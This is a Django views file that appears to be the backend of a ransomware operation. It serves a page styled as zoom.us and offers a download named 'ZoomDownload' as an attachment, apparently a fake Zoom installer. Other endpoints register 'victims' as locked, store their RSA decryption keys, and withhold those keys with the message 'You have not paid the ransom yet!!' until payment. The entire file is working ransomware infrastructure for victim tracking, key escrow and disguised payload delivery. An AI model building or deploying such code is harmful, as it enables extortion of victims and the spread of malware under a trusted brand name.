from django.shortcuts import render
from django.http import HttpResponse
from django.db import transaction
from django.shortcuts import get_object_or_404
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
import mimetypes
from . models import User,File
import json
import os
from . serializers import userSerializer, fileSerializer

locked = True
# Create your views here.

class zoom(APIView):
    def get(self, req):
        return render(req,"zoom.us.html" )
    
    
class userList(APIView):
    
    def get(self,response):
        user1 = User.objects.all()
        serializer = userSerializer(user1,many = True)
        return Response(serializer.data)
    
    def post(self,request):
        if request.method == 'POST':
            victim = json.loads(request.body.decode('utf-8'))
            User.objects.create(user_id= victim['user_id'],time = victim['time'],locked = True)
        return Response("saved possibly")
    
class fileList(APIView):
    
    def get(self,response):
        if response.body != None and response.body != b'':
            files = File.objects.filter(victim = json.loads(response.body.decode('utf-8'))['victim'])
            
        else:
            files = File.objects.all()
        vic = User.objects.get(user_id= json.loads(response.body.decode('utf-8'))['victim'])
        if(vic.locked == False):
            serializer = fileSerializer(files,many = True)   
            return Response(serializer.data)
        return Response("You have not paid the ransom yet!!")
    
    def post(self,request):
        if request.method == 'POST':
            file_data = json.loads(request.body.decode('utf-8'))
            File.objects.create(victim = User.objects.get(user_id = file_data['victim']),rsa_key = file_data['rsa_key'])
        return Response("saved possibly")
    
class download(APIView):
    def get(self,req):
        # Define Django project base directory
        BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        print(BASE_DIR)
        #Define text file name
        filename = 'ZoomDownload'
        # Define the full file path
        filepath = BASE_DIR + '/downloads/' + filename
        # Open the file for reading content
        path = open(filepath, 'rb')
        # Set the mime type
        mime_type, _ = mimetypes.guess_type(filepath)
        # Set the return value of the HttpResponse
        response = HttpResponse(path, content_type=mime_type)
        # Set the HTTP header for sending to browser
        response['Content-Disposition'] = "attachment; filename=%s" % filename
        # Return the response value
        
        return response